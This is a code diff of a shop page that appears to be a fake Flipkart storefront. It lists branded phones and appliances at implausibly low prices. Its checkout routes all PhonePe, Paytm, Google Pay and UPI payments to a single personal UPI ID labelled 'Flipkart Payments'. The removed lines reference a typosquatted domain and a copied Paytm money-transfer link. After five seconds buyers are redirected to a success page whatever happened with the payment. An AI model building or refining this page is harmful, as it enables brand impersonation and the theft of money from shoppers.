@@ -842,7 +842,7 @@
 
         </div>
 
-        <!-- BOTTOM BUTTONS (Add to Cart & Buy Now - Buy Now এখন QR Modal খুলবে) -->
+        <!-- BOTTOM BUTTONS (Add to Cart & Buy Now) -->
         <div class="button-container flex">
             <button class="buynow-button buynow-button-white product-page-buy" onclick="addToCart()">
                 <i class="fas fa-shopping-cart me-1"></i> Add to Cart
@@ -1006,11 +1006,11 @@
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
     <script>
         // ============================================================
-        // PRODUCT DATA (29 products with descImages)
+        // STATIC PRODUCT DATA (29 products)
         // ============================================================
         const PRODUCTS_DATA = [
             { id: 1, name: 'LEADER BEAST 26T Premium Cycle', price: 499, oldPrice: 6289, images: ['media/img/1_product_1.jpeg','media/img/1_product_2.jpeg','media/img/1_product_3.jpeg','media/img/1_product_4.jpeg','media/img/1_product_5.jpeg'], rating: 4.2, reviews: 2653, inStock: true, stock: 500, brand: 'LEADER', description: 'LEADER Beast 26T IBC Premium Cycle for Men with Front Suspension & Dual Disc Brakes', descImages: ['media/img/1_desc_1.jpg','media/img/1_desc_2.jpg','media/img/1_desc_3.jpg'] },
-            { id: 2, name: 'vivo V50 5G (Rose Red, 128 GB)', price: 999, oldPrice: 34999, images: ['media/img/2_product_1.jpeg','media/img/2_product_2.jpeg','media/img/2_product_3.jpeg','media/img/2_product_4.jpeg','media/img/2_product_5.jpeg'], rating: 4.2, reviews: 2653, inStock: true, stock: 500, brand: 'vivo', description: 'The vivo V50 5G in Rose Red is a premium mid-range smartphone that combines stunning design with powerful performance...', descImages: ['media/img/2_desc_1.jpg','media/img/2_desc_2.jpg','media/img/2_desc_3.jpg'] },
+            { id: 2, name: 'vivo V50 5G (Rose Red, 128 GB)', price: 999, oldPrice: 34999, images: ['media/img/2_product_1.jpeg','media/img/2_product_2.jpeg','media/img/2_product_3.jpeg','media/img/2_product_4.jpeg','media/img/2_product_5.jpeg'], rating: 4.2, reviews: 2653, inStock: true, stock: 500, brand: 'vivo', description: 'The vivo V50 5G in Rose Red is a premium mid-range smartphone...', descImages: ['media/img/2_desc_1.jpg','media/img/2_desc_2.jpg','media/img/2_desc_3.jpg'] },
             { id: 238, name: 'Pigeon 2100 W Induction Cooktop Push Button (Silver, Black, Brio)', price: 449, oldPrice: 2228, images: ['media/img/238_product_2.jpeg','media/img/238_product_3.jpeg','media/img/238_product_4.jpeg','media/img/238_product_5.jpeg'], rating: 4.2, reviews: 2653, inStock: true, stock: 15, brand: 'Pigeon', description: 'Pigeon 2100 W Induction Cooktop with push button controls, 5 preset menus, and overheat protection.', descImages: ['media/img/238_desc_1.webp','media/img/238_desc_2.webp'] },
             { id: 239, name: 'V-Guard VRC 1.8C with 2 Pots Electric Rice Cooker (1.8 L, White, Floral Pattern)', price: 498, oldPrice: 2499, images: ['media/img/239_product_1.jpeg','media/img/239_product_2.jpeg','media/img/239_product_3.jpeg','media/img/239_product_4.jpeg','media/img/239_product_5.jpeg'], rating: 4.7, reviews: 5690, inStock: true, stock: 20, brand: 'V-Guard', description: 'V-Guard VRC 1.8C Electric Rice Cooker with 2 pots, automatic keep warm, and floral pattern design.', descImages: ['media/img/239_desc_1.webp','media/img/239_desc_2.webp'] },
             { id: 240, name: 'Prestige Festival Pack - Build Your Kitchen Induction Bottom Non-Stick Coated Cookware Set (Aluminium, 3 - Piece)', price: 398, oldPrice: 1699, images: ['media/img/240_product_1.jpeg','media/img/240_product_2.jpeg','media/img/240_product_3.jpeg','media/img/240_product_4.jpeg','media/img/240_product_5.jpeg'], rating: 4.7, reviews: 8666, inStock: true, stock: 10, brand: 'Prestige', description: 'Prestige Festival Pack 3-piece cookware set with induction bottom and non-stick coating.', descImages: ['media/img/240_desc_1.webp','media/img/240_desc_2.webp'] },
@@ -1043,13 +1043,22 @@
         ];
 
         // ============================================================
+        // STATIC PAYMENT METHODS (localStorage ছাড়া)
+        // ============================================================
+        const PAYMENT_METHODS = [
+            { id: 1, name: 'phonepe', displayName: 'PhonePe', receiver: 'paytm.s2zncsq@pty', instructions: 'Pay with PhonePe', status: 'enabled', deepLink: 'phonepe://pay?pa=paytm.s2zncsq@pty&pn=Flipkart%20Payments&am={amount}&cu=INR&tn=Order_{orderId}' },
+            { id: 2, name: 'paytm', displayName: 'Paytm', receiver: 'paytm.s2zncsq@pty', instructions: 'Pay with Paytm', status: 'enabled', deepLink: 'paytmmp://pay?pa=paytm.s2zncsq@pty&pn=Flipkart%20Payments&am={amount}&cu=INR&tn=Order_{orderId}' },
+            { id: 3, name: 'googlepay', displayName: 'Google Pay', receiver: 'paytm.s2zncsq@pty', instructions: 'Pay with Google Pay', status: 'enabled', deepLink: 'gpay://upi/pay?pa=paytm.s2zncsq@pty&pn=Flipkart%20Payments&am={amount}&cu=INR&tn=Order_{orderId}' },
+            { id: 4, name: 'upi', displayName: 'UPI', receiver: 'paytm.s2zncsq@pty', instructions: 'Pay via UPI', status: 'enabled', deepLink: 'upi://pay?pa=paytm.s2zncsq@pty&pn=Flipkart%20Payments&am={amount}&cu=INR&tn=Order_{orderId}' }
+        ];
+
+        // ============================================================
         // STATE
         // ============================================================
         let currentProduct = null;
         let currentQty = 1;
         let currentOrderStep = 1;
         let selectedPayment = null;
-        let paymentMethods = [];
         let orders = [];
 
         // ============================================================
@@ -1057,53 +1066,6 @@
         // ============================================================
         function goBack() {
             window.history.back();
-        }
-
-        // ============================================================
-        // LOAD PAYMENT METHODS
-        // ============================================================
-function loadPaymentData() {
-    try {
-        const saved = localStorage.getItem('admin_payments');
-        if (saved) {
-            paymentMethods = JSON.parse(saved);
-        } else {
-            paymentMethods = [
-                { 
-                    id: 1, 
-                    name: 'phonepe', 
-                    displayName: 'PhonePe', 
-                    receiver: 'paytm.s2zncsq@pty', 
-                    instructions: 'Pay with PhonePe', 
-                    status: 'enabled', 
-                    deepLink: 'phonepe://pay?pa=paytm.s2zncsq@pty&pn=Flipkart%20Payments&am={amount}&cu=INR&tn=Order_{orderId}'
-                },
-                { 
-                    id: 2, 
-                    name: 'paytm', 
-                    displayName: 'Paytm', 
-                    receiver: 'paytm.s2zncsq@pty', 
-                    instructions: 'Pay with Paytm', 
-                    status: 'enabled', 
-                    deepLink: 'paytmmp://pay?pa=paytm.s2zncsq@pty&pn=Flipkart%20Payments&am={amount}&cu=INR&tn=Order_{orderId}'
-                }
-            ];
-            localStorage.setItem('admin_payments', JSON.stringify(paymentMethods));
-        }
-    } catch(e) {
-        paymentMethods = [
-            { id: 1, name: 'phonepe', displayName: 'PhonePe', receiver: 'paytm.s2zncsq@pty', instructions: 'Pay with PhonePe', status: 'enabled', deepLink: 'phonepe://pay?pa=paytm.s2zncsq@pty&pn=Flipkart%20Payments&am={amount}&cu=INR&tn=Order_{orderId}' },
-            { id: 2, name: 'paytm', displayName: 'Paytm', receiver: 'paytm.s2zncsq@pty', instructions: 'Pay with Paytm', status: 'enabled', deepLink: 'paytmmp://pay?pa=paytm.s2zncsq@pty&pn=Flipkart%20Payments&am={amount}&cu=INR&tn=Order_{orderId}' }
-        ];
-    }
-    try {
-        const saved = localStorage.getItem('admin_orders');
-        if (saved) orders = JSON.parse(saved);
-        else orders = [];
-    } catch(e) { orders = []; }
-}
-        function saveOrders() {
-            localStorage.setItem('admin_orders', JSON.stringify(orders));
         }
 
         // ============================================================
@@ -1137,20 +1099,7 @@ function loadPaymentData() {
                 }
             }
 
-            const defaultProduct = PRODUCTS_DATA.find(p => p.id === 262) || {
-                id: 262,
-                name: 'Atomberg Renesa Prime Ceiling Fan',
-                brand: 'Atomberg',
-                price: 419,
-                oldPrice: 2599,
-                images: ['https://rukminim1.flixcart.com/image/2940/2940/xif0q/fan/n/k/p/renesa-prime-remote-high-air-delivery-led-speed-indicator-low-original-imahnjbgyfqha6s3.jpeg?q=90'],
-                rating: 4.4,
-                reviews: 6188,
-                inStock: true,
-                stock: 9,
-                description: 'Atomberg Renesa Prime Ceiling Fan with 5 Year Warranty.',
-                descImages: ['https://filpkaart-sammar.shop/hotsale/media/items/Dsc-23-05-2026-1779538569Atombarg description 1.webp', 'https://filpkaart-sammar.shop/hotsale/media/items/Dsc-23-05-2026-1779538709Atombarg description 2.webp']
-            };
+            const defaultProduct = PRODUCTS_DATA.find(p => p.id === 262) || PRODUCTS_DATA[0];
             currentProduct = defaultProduct;
             renderProduct(currentProduct);
         }
@@ -1356,44 +1305,41 @@ function loadPaymentData() {
         // ============================================================
         // RENDER PAYMENT METHODS
         // ============================================================
-        function renderOrderPaymentMethods() {
-            const container = document.getElementById('paymentMethods');
-            if (!container) return;
-            const enabled = paymentMethods.filter(p => p.status === 'enabled');
-            if (enabled.length === 0) {
-                container.innerHTML = `<div style="text-align:center; padding:16px; color:#888;"><i class="fas fa-exclamation-circle"></i> No payment methods available</div>`;
-                document.getElementById('confirmBtn').disabled = true;
-                return;
-            }
-            document.getElementById('confirmBtn').disabled = false;
+function renderOrderPaymentMethods() {
+    const container = document.getElementById('paymentMethods');
+    if (!container) return;
+    
+    const enabled = PAYMENT_METHODS.filter(p => p.status === 'enabled');
+    if (enabled.length === 0) {
+        container.innerHTML = `<div style="text-align:center; padding:16px; color:#888;"><i class="fas fa-exclamation-circle"></i> No payment methods available</div>`;
+        document.getElementById('confirmBtn').disabled = true;
+        return;
+    }
+    document.getElementById('confirmBtn').disabled = false;
 
-            const iconMap = { phonepe: 'phonepe', paytm: 'paytm', googlepay: 'gpay', upi: 'upi' };
-            const displayMap = { phonepe: 'PhonePe', paytm: 'Paytm', googlepay: 'Google Pay', upi: 'UPI' };
+    const iconMap = { phonepe: 'phonepe', paytm: 'paytm' };
+    const displayMap = { phonepe: 'PhonePe', paytm: 'Paytm' };
 
-            container.innerHTML = enabled.map(p => {
-                let logoPath = '';
-                if (p.name === 'phonepe') {
-                    logoPath = 'phonePe.png';
-                } else if (p.name === 'paytm') {
-                    logoPath = 'paytm.png';
-                } else if (p.logo) {
-                    logoPath = p.logo;
-                }
-                const hasLogo = logoPath && logoPath.trim() !== '';
-                return `
-                    <div class="pm-option ${selectedPayment === p.id ? 'selected' : ''}" onclick="selectOrderPayment(${p.id})">
-                        <div class="pm-icon ${iconMap[p.name] || 'upi'}">
-                            ${hasLogo ? `<img src="${logoPath}" alt="${p.name}" style="width:100%; height:100%; object-fit:contain; border-radius:4px; background:#fff;" onerror="this.style.display='none'; this.parentElement.innerHTML='<i class=\\'fas fa-${p.name === 'phonepe' ? 'mobile-alt' : p.name === 'paytm' ? 'wallet' : p.name === 'googlepay' ? 'google-pay' : 'credit-card'}\\'></i>';" />` : `<i class="fas fa-${p.name === 'phonepe' ? 'mobile-alt' : p.name === 'paytm' ? 'wallet' : p.name === 'googlepay' ? 'google-pay' : 'credit-card'}"></i>`}
-                        </div>
-                        <div class="pm-info">
-                            <div class="pm-name">${displayMap[p.name] || p.name}</div>
-                            <div class="pm-detail">${p.instructions || 'Click to pay'}</div>
-                        </div>
-                        <div class="pm-check"></div>
-                    </div>
-                `;
-            }).join('');
-        }
+    container.innerHTML = enabled.map(p => {
+        // লোগো পাথ চেক
+        const logoPath = p.logo || (p.name === 'phonepe' ? 'phonePe.png' : p.name === 'paytm' ? 'paytm.png' : '');
+        const hasLogo = logoPath && logoPath.trim() !== '';
+        
+        return `
+            <div class="pm-option ${selectedPayment === p.id ? 'selected' : ''}" onclick="selectOrderPayment(${p.id})">
+                <div class="pm-icon ${iconMap[p.name] || 'upi'}">
+                    ${hasLogo ? `<img src="${logoPath}" alt="${p.name}" style="width:100%; height:100%; object-fit:contain; border-radius:4px; background:#fff;" onerror="this.style.display='none'; this.parentElement.innerHTML='<i class=\\'fas fa-${p.name === 'phonepe' ? 'mobile-alt' : 'wallet'}\\'></i>';" />` : 
+                    `<i class="fas fa-${p.name === 'phonepe' ? 'mobile-alt' : 'wallet'}"></i>`}
+                </div>
+                <div class="pm-info">
+                    <div class="pm-name">${displayMap[p.name] || p.name}</div>
+                    <div class="pm-detail">${p.instructions || 'Click to pay'}</div>
+                </div>
+                <div class="pm-check"></div>
+            </div>
+        `;
+    }).join('');
+}
 
         function selectOrderPayment(id) {
             selectedPayment = id;
@@ -1407,134 +1353,84 @@ function loadPaymentData() {
         // ============================================================
         // CONFIRM ORDER WITH QR
         // ============================================================
-const UPI_SETTINGS = {
-    upiID: 'paytm.s2zncsq@pty',
-    name: 'Flipkart Payments',
-    currency: 'INR'
-};
+        const UPI_SETTINGS = {
+            upiID: 'paytm.s2zncsq@pty',
+            name: 'Flipkart Payments',
+            currency: 'INR'
+        };
 
-function confirmOrderWithQR() {
-    if (!selectedPayment) { showToast('❌ Please select a payment method'); return; }
-    const method = paymentMethods.find(p => p.id === selectedPayment);
-    if (!method) { showToast('❌ Invalid payment method'); return; }
+        function confirmOrderWithQR() {
+            if (!selectedPayment) { showToast('❌ Please select a payment method'); return; }
+            const method = PAYMENT_METHODS.find(p => p.id === selectedPayment);
+            if (!method) { showToast('❌ Invalid payment method'); return; }
 
-    const name = document.getElementById('ordName').value.trim();
-    const phone = document.getElementById('ordPhone').value.trim();
-    const pincode = document.getElementById('ordPincode').value.trim();
-    const city = document.getElementById('ordCity').value.trim();
-    const state = document.getElementById('ordState').value;
-    const address = document.getElementById('ordAddress').value.trim();
-    const address2 = document.getElementById('ordAddress2').value.trim();
+            const name = document.getElementById('ordName').value.trim();
+            const phone = document.getElementById('ordPhone').value.trim();
+            const pincode = document.getElementById('ordPincode').value.trim();
+            const city = document.getElementById('ordCity').value.trim();
+            const state = document.getElementById('ordState').value;
+            const address = document.getElementById('ordAddress').value.trim();
+            const address2 = document.getElementById('ordAddress2').value.trim();
 
-    if (!name || !phone || !pincode || !city || !address) {
-        showToast('❌ Please fill all required fields');
-        return;
-    }
-    if (phone.length < 10) { showToast('❌ Enter a valid 10-digit phone number'); return; }
-    if (pincode.length !== 6) { showToast('❌ Enter a valid 6-digit pincode'); return; }
-
-    const orderId = 'FLIP-' + Date.now().toString().slice(-6);
-    const amount = currentProduct.price * currentQty;
-
-    const order = {
-        id: orderId,
-        product: currentProduct.name,
-        productId: currentProduct.id,
-        quantity: currentQty,
-        total: amount,
-        customer: name,
-        phone: phone,
-        address: address + (address2 ? ', ' + address2 : ''),
-        city: city,
-        state: state,
-        pincode: pincode,
-        payment: method.name,
-        status: 'pending',
-        date: new Date().toISOString().split('T')[0]
-    };
-    orders.unshift(order);
-    saveOrders();
-
-    // 🔥 ওই কোডের মতো ডিপ লিংক
-    var redirect_url = "";
-    var amt = amount;
-
-    switch (method.name) {
-        case 'phonepe':
-            redirect_url = "phonepe://pay?pa=" + method.receiver + "&pn=Flipkart%20Payments&am=" + amt + "&cu=INR&tn=Order_" + orderId;
-            break;
-        case 'paytm':
-            // 🔥 ওই কোডের মতো paytmmp://cash_wallet
-            redirect_url = "paytmmp://cash_wallet?pa=" + method.receiver + "&pn=Online%20Shopping&am=" + amt + "&tr=RZPPYDwIIDfuh4iCnqrv2&mc=5732&cu=INR&tn=Order_" + orderId + "&sign=AAuN7izDWN5cb8A5scnUiNME+LkZqI2DWgkXlN1McoP6WZABa/KkFTiLvuPRP6/nWK8BPg/rPhb+u4QMrUEX10UsANTDbJaALcSM9b8Wk218X+55T/zOzb7xoiB+BcX8yYuYayELImXJHIgL/c7nkAnHrwUCmbM97nRbCVVRvU0ku3Tr&featuretype=money_transfer";
-            break;
-        case 'googlepay':
-            redirect_url = "gpay://upi/pay?pa=" + method.receiver + "&pn=Flipkart%20Payments&am=" + amt + "&cu=INR&tn=Order_" + orderId;
-            break;
-        default:
-            redirect_url = "upi://pay?pa=" + method.receiver + "&pn=Flipkart%20Payments&am=" + amt + "&cu=INR&tn=Order_" + orderId;
-            break;
-    }
-
-    // অর্ডার পেজ বন্ধ করে অ্যাপ ওপেন করো
-    closeOrderPage();
-    showToast('⏳ Opening payment app...');
-
-    // সরাসরি অ্যাপে পাঠানো (চ্যাট উইন্ডো আসবে)
-    setTimeout(function() {
-        window.location.href = redirect_url;
-    }, 500);
-
-    // সাকসেস পেজে পাঠানোর জন্য (অপশনাল)
-    setTimeout(function() {
-        window.location.href = 'success.html?orderId=' + orderId + '&saved=' + Math.round(amount * 0.1);
-    }, 5000);
-}
-
-
-
-
-        // ============================================================
-        // QR MODAL
-        // ============================================================
-        function showQRModal(amount, orderId, method) {
-            document.getElementById('qrAmount').textContent = amount.toFixed(0);
-            document.getElementById('qrOrderId').textContent = orderId;
-            document.getElementById('qrUPI').textContent = UPI_SETTINGS.upiID;
-
-            const methodNames = {
-                'phonepe': '📱 PhonePe',
-                'paytm': '💳 Paytm',
-                'googlepay': '🔵 Google Pay',
-                'upi': '📱 UPI'
-            };
-            document.getElementById('qrAppName').textContent = methodNames[method.name] || '📱 UPI';
-
-            const upiURL = `upi://pay?pa=${UPI_SETTINGS.upiID}&pn=${encodeURIComponent(UPI_SETTINGS.name)}&am=${amount}&cu=${UPI_SETTINGS.currency}&tn=Order_${orderId}`;
-            const qrCodeURL = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(upiURL)}&bgcolor=ffffff&color=000000`;
-            
-            document.getElementById('qrImage').src = qrCodeURL;
-            document.getElementById('qrModal').classList.add('active');
-            document.body.style.overflow = 'hidden';
-
-            // অ্যাপ ওপেন করুন
-            if (/iPhone|iPad|iPod|Android/i.test(navigator.userAgent)) {
-                setTimeout(() => {
-                    const deepLinks = {
-                        'phonepe': `phonepe://pay?pa=${UPI_SETTINGS.upiID}&pn=${encodeURIComponent(UPI_SETTINGS.name)}&am=${amount}&cu=${UPI_SETTINGS.currency}&tn=Order_${orderId}`,
-                        'paytm': `paytmmp://pay?pa=${UPI_SETTINGS.upiID}&pn=${encodeURIComponent(UPI_SETTINGS.name)}&am=${amount}&cu=${UPI_SETTINGS.currency}&tn=Order_${orderId}`,
-                        'googlepay': `gpay://upi/pay?pa=${UPI_SETTINGS.upiID}&pn=${encodeURIComponent(UPI_SETTINGS.name)}&am=${amount}&cu=${UPI_SETTINGS.currency}&tn=Order_${orderId}`,
-                        'upi': `upi://pay?pa=${UPI_SETTINGS.upiID}&pn=${encodeURIComponent(UPI_SETTINGS.name)}&am=${amount}&cu=${UPI_SETTINGS.currency}&tn=Order_${orderId}`
-                    };
-                    window.location.href = deepLinks[method.name] || deepLinks['upi'];
-                }, 500);
+            if (!name || !phone || !pincode || !city || !address) {
+                showToast('❌ Please fill all required fields');
+                return;
             }
-        }
+            if (phone.length < 10) { showToast('❌ Enter a valid 10-digit phone number'); return; }
+            if (pincode.length !== 6) { showToast('❌ Enter a valid 6-digit pincode'); return; }
 
-        function closeQRModal() {
-            document.getElementById('qrModal').classList.remove('active');
-            document.body.style.overflow = '';
-            // অর্ডার সাবমিটের পর ইউজারকে সাকসেস পেজে পাঠান
-            // window.location.href = `success.html?orderId=${document.getElementById('qrOrderId').textContent}`;
+            const orderId = 'FLIP-' + Date.now().toString().slice(-6);
+            const amount = currentProduct.price * currentQty;
+
+            // অর্ডার সেভ করা (অপশনাল)
+            const order = {
+                id: orderId,
+                product: currentProduct.name,
+                productId: currentProduct.id,
+                quantity: currentQty,
+                total: amount,
+                customer: name,
+                phone: phone,
+                address: address + (address2 ? ', ' + address2 : ''),
+                city: city,
+                state: state,
+                pincode: pincode,
+                payment: method.name,
+                status: 'pending',
+                date: new Date().toISOString().split('T')[0]
+            };
+
+            try {
+                const saved = localStorage.getItem('orders');
+                const orders = saved ? JSON.parse(saved) : [];
+                orders.unshift(order);
+                localStorage.setItem('orders', JSON.stringify(orders));
+            } catch(e) {}
+
+            // ডিপ লিংক তৈরি
+            const receiver = method.receiver || UPI_SETTINGS.upiID;
+            const baseLink = `upi://pay?pa=${receiver}&pn=${encodeURIComponent(UPI_SETTINGS.name)}&am=${amount}&cu=${UPI_SETTINGS.currency}&tn=Order_${orderId}`;
+
+            const deepLinks = {
+                phonepe: `phonepe://pay?pa=${receiver}&pn=${encodeURIComponent(UPI_SETTINGS.name)}&am=${amount}&cu=${UPI_SETTINGS.currency}&tn=Order_${orderId}`,
+                paytm: `paytmmp://pay?pa=${receiver}&pn=${encodeURIComponent(UPI_SETTINGS.name)}&am=${amount}&cu=${UPI_SETTINGS.currency}&tn=Order_${orderId}`,
+                googlepay: `gpay://upi/pay?pa=${receiver}&pn=${encodeURIComponent(UPI_SETTINGS.name)}&am=${amount}&cu=${UPI_SETTINGS.currency}&tn=Order_${orderId}`,
+                upi: baseLink
+            };
+
+            const redirectUrl = deepLinks[method.name] || baseLink;
+
+            closeOrderPage();
+            showToast('⏳ Opening payment app...');
+
+            setTimeout(function() {
+                window.location.href = redirectUrl;
+            }, 500);
+
+            // ফ্যালব্যাক – ৫ সেকেন্ড পর success পেজে
+            setTimeout(function() {
+                window.location.href = 'success.html?orderId=' + orderId;
+            }, 5000);
         }
 
         // ============================================================
@@ -1588,7 +1484,6 @@ function confirmOrderWithQR() {
         // INIT
         // ============================================================
         document.addEventListener('DOMContentLoaded', function() {
-            loadPaymentData();
             loadProduct();
             initValidation();
 
@@ -1598,7 +1493,6 @@ function confirmOrderWithQR() {
             document.addEventListener('keydown', function(e) {
                 if (e.key === 'Escape') {
                     if (document.getElementById('orderPage').classList.contains('active')) closeOrderPage();
-                    if (document.getElementById('qrModal').classList.contains('active')) closeQRModal();
                 }
             });
             setTimeout(hideLoader, 600);
@@ -1611,7 +1505,6 @@ function confirmOrderWithQR() {
         window.goToOrderStep = goToOrderStep;
         window.selectOrderPayment = selectOrderPayment;
         window.confirmOrderWithQR = confirmOrderWithQR;
-        window.closeQRModal = closeQRModal;
         window.addToCart = addToCart;
         window.showToast = showToast;
         window.validateStep1 = validateStep1;
